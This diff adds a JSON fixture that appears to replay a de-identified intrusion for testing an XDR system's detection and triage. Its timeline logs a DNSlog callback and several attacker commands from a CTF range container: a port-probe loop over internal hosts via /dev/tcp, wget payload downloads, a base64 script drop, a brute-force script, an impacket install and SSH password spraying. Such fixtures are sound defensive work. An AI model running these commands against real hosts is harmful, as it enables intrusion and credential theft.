@@ -1,0 +1,511 @@
+{
+ "name": "2026-11-02 Prowl 跳板横向",
+ "note": "生产事件形状脱敏回放，说明见 README.md；lizhen-dev、openxdr-test-linux 的喷洒时刻从真实的 23:30:01、00:22:27 挪进了 node2/node1 的同一个 10 分钟",
+ "assets": [
+  {
+   "name": "uos-server",
+   "group": "prowl",
+   "ips": [
+    "10.1.1.170",
+    "172.17.0.1",
+    "172.18.0.1",
+    "192.168.0.1"
+   ]
+  },
+  {
+   "name": "lizhen-dev",
+   "group": "prowl",
+   "ips": [
+    "10.1.1.183",
+    "172.17.0.1"
+   ]
+  },
+  {
+   "name": "openxdr-node1",
+   "group": "openxdr",
+   "ips": [
+    "10.1.1.198",
+    "10.1.1.199",
+    "172.18.0.1",
+    "172.17.0.1"
+   ]
+  },
+  {
+   "name": "openxdr-node2",
+   "group": "openxdr",
+   "ips": [
+    "10.1.1.197",
+    "172.18.0.1",
+    "172.17.0.1"
+   ]
+  },
+  {
+   "name": "openxdr-test-linux",
+   "group": "test",
+   "ips": [
+    "10.1.1.137",
+    "172.17.0.1"
+   ]
+  }
+ ],
+ "timeline": [
+  {
+   "id": "dnslog",
+   "at": "2026-11-02T21:00:12.568Z",
+   "asset": "uos-server",
+   "class": 4003,
+   "raw": {
+    "query": {
+     "type": "A",
+     "hostname": "3ey6d6.dnslog.cn",
+     "rcode_id": 2
+    },
+    "answers": [],
+    "activity_id": 6,
+    "process": {
+     "pid": 1713,
+     "file": {
+      "path": "/usr/bin/dockerd"
+     },
+     "name": "dockerd"
+    },
+    "dst_endpoint": {
+     "ip": "10.1.1.20",
+     "port": 53
+    },
+    "src_endpoint": {
+     "ip": "172.31.0.2",
+     "port": 40362
+    }
+   }
+  },
+  {
+   "id": "ops-sed",
+   "at": "2026-11-02T21:02:21.198Z",
+   "asset": "uos-server",
+   "class": 1007,
+   "username": "root",
+   "repeat": 30,
+   "every": "5m",
+   "raw": {
+    "activity_id": 1,
+    "process": {
+     "pid": 589176,
+     "file": {
+      "path": "/usr/bin/sed"
+     },
+     "name": "sed",
+     "cmd_line": "/usr/bin/sed -r -e s/^[[:blank:]]*([[:upper:]_]+)=([[:print:][:digit:]\\._-]+|\"[[:print:][:digit:]\\._-]+\")/export \\1=\\2/;t;d /etc/locale.conf",
+     "parent_process": {
+      "file": {
+       "path": "/bin/bash"
+      },
+      "name": "bash",
+      "cmd_line": "bash -c ss -tulnp 2>/dev/null"
+     }
+    },
+    "login_session": {
+     "uid": "41975",
+     "user": "root",
+     "key_fp": "SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+     "src_ip": "10.1.1.35",
+     "key_type": "ED25519",
+     "src_port": 37712,
+     "auth_method": "publickey"
+    }
+   }
+  },
+  {
+   "id": "ops-whoami",
+   "at": "2026-11-02T21:02:21.231Z",
+   "asset": "uos-server",
+   "class": 1007,
+   "username": "root",
+   "repeat": 30,
+   "every": "5m",
+   "raw": {
+    "activity_id": 1,
+    "process": {
+     "pid": 589176,
+     "file": {
+      "path": "/usr/bin/whoami"
+     },
+     "name": "whoami",
+     "cmd_line": "whoami",
+     "parent_process": {
+      "file": {
+       "path": "/bin/bash"
+      },
+      "name": "bash",
+      "cmd_line": "bash -c ss -tulnp 2>/dev/null"
+     }
+    },
+    "login_session": {
+     "uid": "41975",
+     "user": "root",
+     "key_fp": "SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+     "src_ip": "10.1.1.35",
+     "key_type": "ED25519",
+     "src_port": 37712,
+     "auth_method": "publickey"
+    }
+   }
+  },
+  {
+   "id": "license-probe",
+   "at": "2026-11-02T21:03:20.578Z",
+   "asset": "uos-server",
+   "class": 1007,
+   "username": "root",
+   "repeat": 30,
+   "every": "5m",
+   "raw": {
+    "activity_id": 1,
+    "process": {
+     "pid": 571340,
+     "file": {
+      "path": "/bin/sh"
+     },
+     "name": "sh",
+     "cmd_line": "/bin/sh -c timeout 3 bash -c '</dev/tcp/127.0.0.1/18080' || exit 1"
+    },
+    "container": {
+     "uid": "2671cfd279d5",
+     "name": "license-service",
+     "runtime": "docker"
+    }
+   }
+  },
+  {
+   "at": "2026-11-02T22:00:00Z",
+   "triage": {
+    "incidentOf": "dnslog",
+    "verdict": "suspicious"
+   }
+  },
+  {
+   "id": "range-wget-view",
+   "at": "2026-11-02T22:31:31.021Z",
+   "asset": "uos-server",
+   "class": 1007,
+   "username": "ctf",
+   "raw": {
+    "activity_id": 1,
+    "process": {
+     "pid": 470201,
+     "file": {
+      "path": "/usr/bin/wget"
+     },
+     "name": "wget",
+     "cmd_line": "wget -q -O /tmp/i6291/view.json http://10.1.1.191:9090/view"
+    },
+    "container": {
+     "uid": "4f173e0d45b0",
+     "name": "range_c11_comp1_t2",
+     "runtime": "docker"
+    }
+   }
+  },
+  {
+   "id": "range-b64-urlopen",
+   "at": "2026-11-02T22:33:59.960Z",
+   "asset": "uos-server",
+   "class": 1007,
+   "username": "ctf",
+   "raw": {
+    "activity_id": 1,
+    "process": {
+     "pid": 441849,
+     "file": {
+      "path": "/usr/local/bin/python3"
+     },
+     "name": "python3",
+     "cmd_line": "python3 -c import urllib.request,base64,sys;r=urllib.request.Request(sys.argv[1]);[r.add_header('Authorization','Basic '+base64.b64encode(sys.argv[2].encode()).decode())] if len(sys.argv)>2 and sys.argv[2] else None;print(base64.b64encode(urllib.request.urlopen(r,timeout=20).read()).decode()) http://10.1.1.191:9090/ admin:<redacted>"
+    },
+    "container": {
+     "uid": "4f173e0d45b0",
+     "name": "range_c11_comp1_t2",
+     "runtime": "docker"
+    }
+   }
+  },
+  {
+   "id": "range-recon",
+   "at": "2026-11-02T22:34:26.813Z",
+   "asset": "uos-server",
+   "class": 1007,
+   "username": "ctf",
+   "raw": {
+    "activity_id": 1,
+    "process": {
+     "pid": 444514,
+     "file": {
+      "path": "/bin/sh"
+     },
+     "name": "sh",
+     "cmd_line": "/bin/sh -c which curl python3 python nc ncat bash busybox ssh 2>/dev/null; echo ---; for h in 10.1.1.32 10.1.1.111 10.1.1.185 10.1.1.197 10.1.1.198 10.1.1.199 10.1.1.186 10.1.1.183 10.1.1.191; do timeout 3 bash -c \"echo > /dev/tcp/$h/8080\" 2>/dev/null && echo \"$h:8080 OPEN\" || echo \"$h:8080 closed\"; done"
+    },
+    "container": {
+     "uid": "4f173e0d45b0",
+     "name": "range_c11_comp1_t2",
+     "runtime": "docker"
+    }
+   }
+  },
+  {
+   "id": "range-nohup-brute",
+   "at": "2026-11-02T22:34:56.022Z",
+   "asset": "uos-server",
+   "class": 1007,
+   "username": "ctf",
+   "raw": {
+    "activity_id": 1,
+    "process": {
+     "pid": 446116,
+     "file": {
+      "path": "/usr/bin/nohup"
+     },
+     "name": "nohup",
+     "cmd_line": "nohup python3 /tmp/brute.py 10.1.1.191 9090",
+     "parent_process": {
+      "file": {
+       "path": "/bin/sh"
+      },
+      "name": "sh",
+      "cmd_line": "/bin/sh /entrypoint.sh"
+     }
+    },
+    "container": {
+     "uid": "4f173e0d45b0",
+     "name": "range_c11_comp1_t2",
+     "runtime": "docker"
+    }
+   }
+  },
+  {
+   "id": "range-setsid-pip",
+   "at": "2026-11-02T22:35:56.221Z",
+   "asset": "uos-server",
+   "class": 1007,
+   "username": "ctf",
+   "raw": {
+    "activity_id": 1,
+    "process": {
+     "pid": 450642,
+     "file": {
+      "path": "/bin/sh"
+     },
+     "name": "sh",
+     "cmd_line": "/bin/sh -c setsid sh -c 'nohup env http_proxy=http://10.1.1.3:7890 https_proxy=http://10.1.1.3:7890 pip install --quiet impacket >/tmp/pipimp.log 2>&1 &'; echo launched"
+    },
+    "container": {
+     "uid": "4f173e0d45b0",
+     "name": "range_c11_comp1_t2",
+     "runtime": "docker"
+    }
+   }
+  },
+  {
+   "id": "range-wget-jar",
+   "at": "2026-11-02T22:41:27.566Z",
+   "asset": "uos-server",
+   "class": 1007,
+   "username": "ctf",
+   "raw": {
+    "activity_id": 1,
+    "process": {
+     "pid": 475606,
+     "file": {
+      "path": "/usr/bin/wget"
+     },
+     "name": "wget",
+     "cmd_line": "wget -q -O /tmp/i6291/decode.jar http://10.1.1.191:8081/t/x/w0/decode.jar",
+     "parent_process": {
+      "file": {
+       "path": "/bin/sh"
+      },
+      "name": "sh",
+      "cmd_line": "/bin/sh -c wget -q -O /tmp/i6291/decode.jar http://10.1.1.191:8081/t/x/w0/decode.jar; md5sum /tmp/i6291/decode.jar"
+     }
+    },
+    "container": {
+     "uid": "4f173e0d45b0",
+     "name": "range_c11_comp1_t2",
+     "runtime": "docker"
+    }
+   }
+  },
+  {
+   "at": "2026-11-02T22:45:00Z",
+   "triage": {
+    "incidentOf": "range-b64-urlopen",
+    "verdict": "suspicious",
+    "notified": true
+   }
+  },
+  {
+   "id": "range-b64-drop",
+   "at": "2026-11-02T23:02:04.011Z",
+   "asset": "uos-server",
+   "class": 1007,
+   "username": "ctf",
+   "raw": {
+    "activity_id": 1,
+    "process": {
+     "pid": 565428,
+     "file": {
+      "path": "/usr/local/bin/python3"
+     },
+     "name": "python3",
+     "cmd_line": "python3 -c import base64;open('/dev/shm/w/jsgrep.py','wb').write(base64.b64decode('aW1wb3J0IHVybGxpYi5yZXF1ZXN0LHNzbCxnemlwLHJlLHN5cwo='))"
+    },
+    "container": {
+     "uid": "4f173e0d45b0",
+     "name": "range_c11_comp1_t2",
+     "runtime": "docker"
+    }
+   }
+  },
+  {
+   "id": "range-nohup-spray",
+   "at": "2026-11-02T23:11:02.916Z",
+   "asset": "uos-server",
+   "class": 1007,
+   "username": "ctf",
+   "raw": {
+    "activity_id": 1,
+    "process": {
+     "pid": 605019,
+     "file": {
+      "path": "/usr/bin/nohup"
+     },
+     "name": "nohup",
+     "cmd_line": "nohup python3 ssh_test.py top",
+     "parent_process": {
+      "file": {
+       "path": "/bin/sh"
+      },
+      "name": "sh",
+      "cmd_line": "/bin/sh -c echo <redacted> | base64 -d > ssh_test.py; nohup python3 ssh_test.py top"
+     }
+    },
+    "container": {
+     "uid": "4f173e0d45b0",
+     "name": "range_c11_comp1_t2",
+     "runtime": "docker"
+    }
+   }
+  },
+  {
+   "id": "spray-node2",
+   "at": "2026-11-02T23:10:24.176Z",
+   "asset": "openxdr-node2",
+   "class": 3002,
+   "repeat": 12,
+   "every": "1s",
+   "users": [
+    "postgres",
+    "openxdr",
+    "admin",
+    "patroni",
+    "ctf",
+    "root"
+   ],
+   "raw": {
+    "user": {
+     "name": "postgres"
+    },
+    "service": {
+     "name": "sshd"
+    },
+    "status_id": 2,
+    "activity_id": 1,
+    "src_endpoint": {
+     "ip": "10.1.1.170"
+    }
+   }
+  },
+  {
+   "id": "spray-node1",
+   "at": "2026-11-02T23:11:23.134Z",
+   "asset": "openxdr-node1",
+   "class": 3002,
+   "repeat": 12,
+   "every": "1s",
+   "users": [
+    "postgres",
+    "openxdr",
+    "admin",
+    "patroni",
+    "ctf",
+    "root"
+   ],
+   "raw": {
+    "user": {
+     "name": "postgres"
+    },
+    "service": {
+     "name": "sshd"
+    },
+    "status_id": 2,
+    "activity_id": 1,
+    "src_endpoint": {
+     "ip": "10.1.1.170"
+    }
+   }
+  },
+  {
+   "id": "spray-lizhen",
+   "at": "2026-11-02T23:11:55.321Z",
+   "asset": "lizhen-dev",
+   "class": 3002,
+   "repeat": 3,
+   "every": "100ms",
+   "users": [
+    "admin",
+    "lizhen",
+    "ubuntu"
+   ],
+   "raw": {
+    "user": {
+     "name": "admin"
+    },
+    "service": {
+     "name": "sshd"
+    },
+    "status_id": 2,
+    "activity_id": 1,
+    "src_endpoint": {
+     "ip": "10.1.1.170"
+    }
+   }
+  },
+  {
+   "id": "spray-test-linux",
+   "at": "2026-11-02T23:12:05.596Z",
+   "asset": "openxdr-test-linux",
+   "class": 3002,
+   "repeat": 12,
+   "every": "1s",
+   "users": [
+    "admin",
+    "openxdr",
+    "test",
+    "ubuntu"
+   ],
+   "raw": {
+    "user": {
+     "name": "admin"
+    },
+    "service": {
+     "name": "sshd"
+    },
+    "status_id": 2,
+    "activity_id": 1,
+    "src_endpoint": {
+     "ip": "10.1.1.170"
+    }
+   }
+  }
+ ]
+}
